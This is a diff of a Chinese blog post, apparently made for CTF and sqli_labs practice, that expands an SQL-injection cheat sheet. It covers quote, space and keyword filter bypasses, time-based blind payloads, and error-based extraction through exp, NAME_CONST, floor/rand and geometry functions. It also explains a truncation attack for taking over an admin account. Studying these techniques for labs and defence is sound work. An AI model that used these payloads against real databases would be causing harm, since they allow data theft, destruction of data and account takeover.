@@ -16,24 +16,24 @@
   <meta name="author" content="7bmk">
   <meta name="keywords" content="">
   
-    <meta name="description" content="大佬绕过floor、updatexml、extractValue等报错、盲注、php反弹shell 单引号绕过当sql语句是用单引号闭合，而单引号又被限制时，绕过的一些方法 用\将原有的’转义掉eg: 1?username&#x3D;1\&amp;password&#x3D;1 or 1&#x3D;1# (此处注意，如果浏览器使用burp代理或hackbar发送,主义检查把payload中的’&#39;换成’\‘，否则会发现b">
+    <meta name="description" content="大佬绕过很久没刷sql注入了，然后就忘得差8多了，为此觉得有必要总结一手 然后总结完发现居然有这么多，要是一个一个试那是8是还8如拿sqlmap扫… 参考: sqli_labs刷题、网上博客、组会的pdf 关于绕过单引号绕过当sql语句是用单引号闭合，而单引号又被限制时，绕过的一些方法 用\将原有的’转义掉eg: 1?username&#x3D;1\&amp;password&#x3D;1 or 1&#x3D;1# (此处注意">
 <meta property="og:type" content="article">
-<meta property="og:title" content="一些sql注入姿势的总结原理">
-<meta property="og:url" content="http://example.com/2021/11/05/sql%E4%B8%80%E4%BA%9B%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%8E%9F%E7%90%86/index.html">
+<meta property="og:title" content="一些sql注入姿势的总结(抄作业)">
+<meta property="og:url" content="http://example.com/2022/01/08/sql%E4%B8%80%E4%BA%9B%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%8E%9F%E7%90%86/index.html">
 <meta property="og:site_name">
-<meta property="og:description" content="大佬绕过floor、updatexml、extractValue等报错、盲注、php反弹shell 单引号绕过当sql语句是用单引号闭合，而单引号又被限制时，绕过的一些方法 用\将原有的’转义掉eg: 1?username&#x3D;1\&amp;password&#x3D;1 or 1&#x3D;1# (此处注意，如果浏览器使用burp代理或hackbar发送,主义检查把payload中的’&#39;换成’\‘，否则会发现b">
+<meta property="og:description" content="大佬绕过很久没刷sql注入了，然后就忘得差8多了，为此觉得有必要总结一手 然后总结完发现居然有这么多，要是一个一个试那是8是还8如拿sqlmap扫… 参考: sqli_labs刷题、网上博客、组会的pdf 关于绕过单引号绕过当sql语句是用单引号闭合，而单引号又被限制时，绕过的一些方法 用\将原有的’转义掉eg: 1?username&#x3D;1\&amp;password&#x3D;1 or 1&#x3D;1# (此处注意">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/sql%E6%B3%A8%E5%85%A5(1).png">
 <meta property="og:image" content="http://example.com/images/sqli_labs/sqli_labs(5).png">
-<meta property="article:published_time" content="2021-11-05T03:33:06.000Z">
-<meta property="article:modified_time" content="2022-01-03T09:48:32.000Z">
+<meta property="article:published_time" content="2022-01-08T03:33:06.000Z">
+<meta property="article:modified_time" content="2022-04-09T10:29:28.919Z">
 <meta property="article:author" content="7bmk">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/images/sql%E6%B3%A8%E5%85%A5(1).png">
   
   
-  <title>一些sql注入姿势的总结原理 - </title>
+  <title>一些sql注入姿势的总结(抄作业) - </title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -191,7 +191,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="一些sql注入姿势的总结原理">
+            <span class="h2" id="subtitle" title="一些sql注入姿势的总结(抄作业)">
               
             </span>
 
@@ -201,8 +201,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-11-05 11:33" pubdate>
-        November 5, 2021 am
+      <time datetime="2022-01-08 11:33" pubdate>
+        January 8, 2022 am
       </time>
     </span>
   
@@ -212,7 +212,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      3.4k 字
+      5.9k 字
     </span>
   
 
@@ -221,7 +221,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      29 分钟
+      50 分钟
     </span>
   
 
@@ -250,18 +250,28 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">一些sql注入姿势的总结原理</h1>
+            <h1 style="display: none">一些sql注入姿势的总结(抄作业)</h1>
             
             <div class="markdown-body">
-              <p>大佬绕过<br>floor、updatexml、extractValue等报错、盲注、php反弹shell</p>
-<h1 id="单引号绕过"><a href="#单引号绕过" class="headerlink" title="单引号绕过"></a>单引号绕过</h1><p>当sql语句是用单引号闭合，而单引号又被限制时，绕过的一些方法</p>
-<h2 id="用-将原有的’转义掉"><a href="#用-将原有的’转义掉" class="headerlink" title="用\将原有的’转义掉"></a>用\将原有的’转义掉</h2><p>eg:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs sql">?username<span class="hljs-operator">=</span><span class="hljs-number">1</span>\<span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure>
-<p>(此处注意，如果浏览器使用burp代理或hackbar发送,主义检查把payload中的’&#39;换成’\‘，否则会发现burp在发送请求时’&#39;已经被转义，图为burp代理下用hackbar发送请求结果)<br><img src="/images/sql%E6%B3%A8%E5%85%A5(1).png" srcset="/img/loading.gif" lazyload><br>至于是burp还是hackbar转义，俺也8知道，也懒得知道</p>
-<h2 id="避免使用单引号，使用函数进行代替"><a href="#避免使用单引号，使用函数进行代替" class="headerlink" title="避免使用单引号，使用函数进行代替"></a>避免使用单引号，使用函数进行代替</h2><p>eg:<br>将 where table_schema&#x3D;’c’替换为where table_schema&#x3D;char(99)</p>
+              <p>大佬绕过<br>很久没刷sql注入了，然后就忘得差8多了，为此觉得有必要总结一手</p>
+<p>然后总结完发现居然有这么多，要是一个一个试那是8是还8如拿sqlmap扫…</p>
+<p>参考: sqli_labs刷题、网上博客、组会的pdf</p>
+<h1 id="关于绕过"><a href="#关于绕过" class="headerlink" title="关于绕过"></a>关于绕过</h1><h2 id="单引号绕过"><a href="#单引号绕过" class="headerlink" title="单引号绕过"></a>单引号绕过</h2><p>当sql语句是用单引号闭合，而单引号又被限制时，绕过的一些方法</p>
+<h3 id="用-将原有的’转义掉"><a href="#用-将原有的’转义掉" class="headerlink" title="用\将原有的’转义掉"></a>用\将原有的’转义掉</h3><p>eg:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">username</span>=1\&amp;password=1 <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1#<br></code></pre></td></tr></table></figure>
+<p>(此处注意，如果浏览器使用burp代理或hackbar发送,注意检查把payload中的’&#39;换成’\‘，否则会发现burp在发送请求时’&#39;已经被转义，图为burp代理下用hackbar发送请求结果)<br><img src="/images/sql%E6%B3%A8%E5%85%A5(1).png" srcset="/img/loading.gif" lazyload><br>至于是burp还是hackbar转义，俺也8知道，也懒得知道</p>
+<h3 id="避免使用单引号，使用函数进行代替"><a href="#避免使用单引号，使用函数进行代替" class="headerlink" title="避免使用单引号，使用函数进行代替"></a>避免使用单引号，使用函数进行代替</h3><p>eg:<br>将 where table_schema&#x3D;’c’替换为where table_schema&#x3D;char(99)</p>
+<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><h3 id="注释绕过空格"><a href="#注释绕过空格" class="headerlink" title="注释绕过空格"></a>注释绕过空格</h3><p>eg: </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/*!select*/</span><span class="hljs-regexp">/*!version()*/</span><br></code></pre></td></tr></table></figure>
+<p>emmmmmm….</p>
+<h2 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>selselectect</p>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>mysql是8分大小写的，所以你懂的</p>
+<h3 id="16进制-绕过被屏蔽的表名、列名、数据库名"><a href="#16进制-绕过被屏蔽的表名、列名、数据库名" class="headerlink" title="16进制: 绕过被屏蔽的表名、列名、数据库名"></a>16进制: 绕过被屏蔽的表名、列名、数据库名</h3><p>用16进制编码代替关键字，只可用来查询被屏蔽的表名等(8能绕过select)<br>比如’admin’的16进制:<br>0x61<br>0x64<br>0x6d<br>0x69<br>0x6e<br>于是:<br>select * from user where username &#x3D; 0x61646d696e;</p>
+<h2 id="关键字过滤代替表"><a href="#关键字过滤代替表" class="headerlink" title="关键字过滤代替表"></a>关键字过滤代替表</h2><p>空格: &#x2F;**&#x2F; %20 %a0 %0a +<br>and: &amp;&amp;<br>or: ||<br>limit: having<br>select: ⼀般是堆叠注⼊</p>
+<p>information_schema:<br>mysql.innodb_table_stats<br>innodb_index_stats<br>sys.schema_table_statistics_with_buffer<br>sys.schema_auto_increment_columns</p>
+<h1 id="常用查询语句"><a href="#常用查询语句" class="headerlink" title="常用查询语句"></a>常用查询语句</h1><p>感觉没必要水的，但谁叫我记性差..<br>group_concat(id,username,passowrd) from table1;<br>group_concat: 把column里的所有内容用,连成1个<br>database()<br>查询schema:<br>-1’ ununionion seleselectct 1,2,schema_name frofromm infoorrormation_schema.schemata;#    &#x2F;&#x2F;此处是information_schema.schemata<br>show databases;</p>
 <h1 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h1><h2 id="什么是双查询注入"><a href="#什么是双查询注入" class="headerlink" title="什么是双查询注入"></a>什么是双查询注入</h2><p>双查询注入，俺的理解大概就是就是select语句里再套1个select，比如: select concat((select database()));</p>
-<h2 id="双查询注入原理"><a href="#双查询注入原理" class="headerlink" title="双查询注入原理"></a>双查询注入原理</h2><p>这就是利用报错来回显数据呗。。。没个10年搓代码功底谁能知道这个报错</p>
-<p>原理: 有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来<br>若想详细了解，阔以参考这篇博客: <a target="_blank" rel="noopener" href="https://blog.csdn.net/lixiangminghate/article/details/80466257">链接</a></p>
+<h2 id="双查询注入原理"><a href="#双查询注入原理" class="headerlink" title="双查询注入原理"></a>双查询注入原理</h2><p>这就是利用报错来回显数据呗。。。没个10年搓代码功底谁能知道这个报错<br>a<br>原理: 有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来<br>若想详细了解，阔以参考这篇博客: <a target="_blank" rel="noopener" href="https://blog.csdn.net/lixiangminghate/article/details/80466257">链接</a></p>
 <p>yes, 爷看完了, 看了3遍, 爷觉得自己应该明白了(确信)</p>
 <h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h3 id="利用limit-n-1"><a href="#利用limit-n-1" class="headerlink" title="利用limit n,1"></a>利用limit n,1</h3><p>有时候会限制输出的行数，这时往往会报错: Subquery returns more than 1 row</p>
 <p>这时就要巧用limit，比如: </p>
@@ -295,8 +305,7 @@
 <p>把你要爆的信息写入文件，再用netcat、菜刀啦什么的访问</p>
 <h2 id="secure-file-priv"><a href="#secure-file-priv" class="headerlink" title="secure_file_priv"></a>secure_file_priv</h2><p>secure_file_priv 用来限制导出效果。他有三个属性：<br>null: 限制不能导出<br>为空: 可以自定义<br>为路径: 则只能导出到指定路径</p>
 <p>待更</p>
-<h1 id="我超，到盲注了"><a href="#我超，到盲注了" class="headerlink" title="我超，到盲注了"></a>我超，到盲注了</h1><p>你踏马真是个fw，2个小时多连个p都出不来</p>
-<p>参考:<a target="_blank" rel="noopener" href="https://blog.csdn.net/szlg510027010/article/details/107171100/">链接</a><br>盲注就是在注入过程中数据不能回显到前端页面，全靠猜(所以叫布尔)<br>而又因为全靠猜，所以得搓脚本</p>
+<h1 id="我超，到盲注了"><a href="#我超，到盲注了" class="headerlink" title="我超，到盲注了"></a>我超，到盲注了</h1><p>参考:<a target="_blank" rel="noopener" href="https://blog.csdn.net/szlg510027010/article/details/107171100/">链接</a><br>盲注就是在注入过程中数据不能回显到前端页面，全靠猜(所以叫布尔)<br>而又因为全靠猜，所以得搓脚本</p>
 <p>3种类型: 基于布尔、时间、报错的盲注</p>
 <h2 id="大致说明"><a href="#大致说明" class="headerlink" title="大致说明"></a>大致说明</h2><p>基于时间:怎么个基于时间？其实就是也有点布尔的意思，并且还需要结合布尔，如果我这样注入，猜测是对是错，由时间来做抉择，如果是对，延迟几秒再显示页面，如果是错，就正常显示页面</p>
 <p>基于布尔，怎么个基于布尔？其实跟时间很像，只不过做裁决的不再是时间，而是返回的数据本身，比如，在sqli_labs第8关里，查ABC这一数据，问第一个字母的 ASCII 值是不是大于 100 ，如果正确，页面就会显示 you are in…，如果错误就什么都不显示</p>
@@ -321,7 +330,7 @@
 <p>而前面判断单双引号及闭合时，也要通过and sleep(5)判断是否正确</p>
 <p>简单举例，不赘述</p>
 <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and if(<span class="hljs-name">database</span>()=&#x27;security&#x27;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)-- <br></code></pre></td></tr></table></figure>
-
+<p>sleep()<br>benchmark(10000000,sha(1))  (约等于3s)</p>
 <h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>eg:<br>buuctf: [强网杯 2019]随便注</p>
 <p>堆叠注入很强大，可以用于执行任何SQL语句。</p>
 <p>堆叠注入原理<br>就是用’;’把1个语句结束，再用继续输入其他的语句</p>
@@ -329,6 +338,25 @@
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">mysql&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id =<span class="hljs-number">1</span>;<span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> users;<br></code></pre></td></tr></table></figure>
 
 <p>堆叠注入的局限性<br>堆叠注入不是任何情况下都能使用的(大多数时候，因为<del>API或数据库引擎的不支持</del>玄学问题，堆叠注入都无法实现)</p>
+<h1 id="exp报错注入"><a href="#exp报错注入" class="headerlink" title="exp报错注入"></a>exp报错注入</h1><p>原理:<br>exp():计算e的x次方的函数，数字太大会产生溢出，在参数&gt;&#x3D;709时报错<br>然后在此条件上进行一些看8懂的奇怪操作，然后payload就有了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> (<span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (payload) a)))<br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span>(<span class="hljs-operator">!</span>x<span class="hljs-operator">-</span><span class="hljs-operator">~</span><span class="hljs-number">0</span>)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)a);<br></code></pre></td></tr></table></figure>
+<p>eg:<br>select * fromusers where and (exp(~(select * from (payload) a)));<br>应用条件<br>5.5&lt; mysql版本&lt; 5.6  (啊这..)</p>
+<h1 id="利用’-’的溢出报错"><a href="#利用’-’的溢出报错" class="headerlink" title="利用’!’的溢出报错"></a>利用’!’的溢出报错</h1><p>原理:<br>太难了，<del>看8懂</del> 没细看<br>?id&#x3D;1’ union select (!(select * from (select user())x) - ~0),2,3–+</p>
+<h1 id="NAME-CONST-报错注入"><a href="#NAME-CONST-报错注入" class="headerlink" title="NAME_CONST()报错注入"></a>NAME_CONST()报错注入</h1><p>原理:<br>mysql列名重复会导致报错,通过name_const制造一个列<br>payload:</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">and <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> name_const(payload,<span class="hljs-number">0</span>)) a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> name_const(payload,<span class="hljs-number">0</span>)) b)c)<br></code></pre></td></tr></table></figure>
+
+<h1 id="主键重复报错"><a href="#主键重复报错" class="headerlink" title="主键重复报错"></a>主键重复报错</h1><p>条件: version&lt; 5.5.53<br>select * from user where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</p>
+<h1 id="几何函数报错"><a href="#几何函数报错" class="headerlink" title="几何函数报错"></a>几何函数报错</h1><p>5.7.17 &gt; version &gt; 5.5.47</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">geometrycollection()<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> geometrycollection((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> *<br><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br>multipoint()<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multipoint((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span><br><span class="hljs-keyword">user</span>())a)b));<br>polygon()<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span><br><span class="hljs-keyword">user</span>())a)b));<br>multipolygon()<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multipolygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span><br><span class="hljs-keyword">user</span>())a)b));<br>linestring()<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> linestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span><br><span class="hljs-keyword">user</span>())a)b));<br>multilinestring()<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multilinestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> *<br><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure>
+
+<h1 id="sql约束攻击"><a href="#sql约束攻击" class="headerlink" title="sql约束攻击"></a>sql约束攻击</h1><p>原理:<br>sql中 insert 和 select 对⻓度和空格的处理⽅式差异造成的漏洞：select 语句对于参数后⾯空格的处理是删除，<br>insert 只是截取最⼤⻓度25的字符串，然后插⼊数据库。<br>假设⼀种情况，⽹⻚输⼊⽤户名，⾸先检查⽤户名是否在数据库中，如果不在就注册为新⽤户</p>
+<ol>
+<li>数据库中存在⼀个管理员 admin</li>
+<li>我们输⼊⼀个⽤户名为 admin+20个空格+1</li>
+<li>检查的时候调⽤ select 语句，空格被删除，剩下了 admin1 ，不在数据库中</li>
+<li>调⽤ insert 注册 admin+20个空格+1 作为新的⽤户 ，这时该⽤户使⽤我们设置的密码</li>
+<li>我们再输⼊ admin 进⾏查询，select 语句就会返回两条数据，⼀条是原本的 admin，另⼀条是被select截取<br>了的admin，第⼆个admin可以匹配我们设置的密码，就可以登陆了<br>新版本mysql已经修复 insert 时⾃动截取的问题</li>
+</ol>
 
             </div>
             <hr>
@@ -365,9 +393,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/11/17/sqli-labs-%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-3/">
+                      <a href="/2022/01/09/xdu%E6%8A%97%E7%96%ABCTF/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">sqli_labs 解题笔记(3)</span>
+                        <span class="hidden-mobile">xdu抗疫CTF</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -375,8 +403,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/10/29/sqli-lab-%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-2/">
-                        <span class="hidden-mobile">sqli_labs 解题笔记(2)</span>
+                      <a href="/2022/01/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E9%80%9F%E6%9F%A5/">
+                        <span class="hidden-mobile">正则表达式备忘速查</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
